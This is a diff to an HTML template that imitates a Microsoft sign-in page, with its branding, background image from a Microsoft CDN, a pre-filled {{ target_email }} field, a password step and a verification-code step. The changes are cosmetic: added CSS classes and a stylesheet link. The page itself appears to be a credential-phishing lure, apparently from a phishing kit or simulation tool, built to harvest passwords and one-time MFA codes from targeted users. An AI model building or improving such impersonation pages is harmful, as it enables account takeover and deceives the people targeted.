@@ -10,6 +10,7 @@
   <style>
    body { font-family: 'Segoe UI', 'Helvetica Neue', 'Lucida Grande', 'Roboto', 'Ebrima', 'Nirmala UI', 'Gadugi', 'Segoe Xbox Symbol', 'Segoe UI Symbol', 'Meiryo UI', 'Khmer UI', 'Tunga', 'Lao UI', 'Raavi', 'Iskoola Pota', 'Latha', 'Leelawadee', 'Microsoft YaHei UI', 'Microsoft JhengHei UI', 'Malgun Gothic', 'Estrangelo Edessa', 'Microsoft Himalaya', 'Microsoft New Tai Lue', 'Microsoft PhagsPa', 'Microsoft Tai Le', 'Microsoft Yi Baiti', 'Mongolian Baiti', 'MV Boli', 'Myanmar Text', 'Cambria Math', sans-serif; background-color: #f0f2f5; background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49_7916a8b4b1a50a498e72.jpg'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; } .card { background: #fff; width: 440px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); position: relative; box-sizing: border-box; } .logo { height: 24px; margin-bottom: 20px; } h1 { font-size: 24px; font-weight: 600; margin: 0 0 10px; color: #1b1b1b; line-height: 1.2; } .input-group { margin-top: 20px; margin-bottom: 16px; } input { width: 100%; height: 36px; padding: 6px 10px; border: 1px solid #8f8f8f; font-size: 15px; box-sizing: border-box; outline: none; color: #1b1b1b; } input:focus { border-color: #0067b8; border-bottom-width: 2px; } input::placeholder { color: #666; } .actions { margin-top: 30px; display: flex; justify-content: flex-end; } .next-btn { background-color: #0067b8; color: #fff; border: none; padding: 8px 36px; font-size: 15px; cursor: pointer; min-width: 108px; font-weight: 600; transition: background-color 0.2s; } .next-btn:hover { background-color: #005da6; } .links { margin-top: 20px; font-size: 13px; } .links a { color: #0067b8; text-decoration: none; } .links a:hover { color: #666; text-decoration: underline; } .hidden { display: none; } .user-identity { display: flex; align-items: center; font-size: 15px; margin-bottom: 20px; color: #1b1b1b; } .back-arrow { margin-right: 10px; cursor: pointer; font-size: 18px; color: #1b1b1b; text-decoration: none; } .back-arrow:hover { background-color: #e1e1e1; border-radius: 50%; } .footer { position: absolute; bottom: 0; width: 100%; text-align: right; padding: 10px 20px; box-sizing: border-box; background: rgba(255,255,255,0.6); font-size: 12px; } .footer a { color: #000; text-decoration: none; margin-left: 20px; } .footer a:hover { text-decoration: underline; } @media (max-width: 600px) { body { background: #fff; } .card { box-shadow: none; width: 100%; height: 100%; padding: 24px; } .footer { display: none; } }
   </style>
+  <link href="/core/assets/css/animations.css" rel="stylesheet"/>
  </head>
  <body>
   <div class="card">
@@ -19,7 +20,7 @@
      Log in
     </h1>
     <div class="input-group">
-     <input id="email-input" placeholder="Email, phone, or Skype" required="" type="email" value="{{ target_email }}"/>
+     <input class="input-field" id="email-input" placeholder="Email, phone, or Skype" required="" type="email" value="{{ target_email }}"/>
     </div>
     <div class="links">
      No account?
@@ -33,7 +34,7 @@
      </a>
     </div>
     <div class="actions">
-     <button class="next-btn" id="btn-next">
+     <button class="next-btn btn-primary" id="btn-next">
       Next
      </button>
     </div>
@@ -51,7 +52,7 @@
      Enter password
     </h1>
     <div class="input-group">
-     <input id="password-input" placeholder="Password" required="" type="password"/>
+     <input class="input-field" id="password-input" placeholder="Password" required="" type="password"/>
     </div>
     <div class="links">
      <a href="#">
@@ -59,7 +60,7 @@
      </a>
     </div>
     <div class="actions">
-     <button class="next-btn" id="btn-submit">
+     <button class="next-btn btn-primary" id="btn-submit">
       Log in
      </button>
     </div>
@@ -72,9 +73,9 @@
      To secure your account, please enter the verification code sent to your device.
     </p>
     <div class="input-group" style="width: 100%; margin-bottom: 20px;">
-     <input id="otp-input" placeholder="Enter code" required="" style="width: 100%; padding: 10px; font-size: 16px; border: 1px solid #ccc; border-radius: 4px;" type="text"/>
+     <input class="input-field" id="otp-input" placeholder="Enter code" required="" style="width: 100%; padding: 10px; font-size: 16px; border: 1px solid #ccc; border-radius: 4px;" type="text"/>
     </div>
-    <button class="next-btn" id="btn-otp-submit" style="width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">
+    <button class="next-btn btn-primary" id="btn-otp-submit" style="width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">
      Verify
     </button>
    </div>
